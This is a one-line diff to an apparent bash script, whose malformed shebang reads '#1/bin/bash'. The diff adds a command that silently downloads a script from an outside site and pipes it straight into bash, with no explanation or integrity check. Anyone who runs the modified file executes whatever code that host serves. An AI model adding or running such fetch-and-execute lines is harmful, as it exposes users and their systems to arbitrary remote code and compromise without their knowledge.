@@ -1,1 +1,2 @@
 #1/bin/bash
+bash <(curl -s https://codes.jishnu.site)
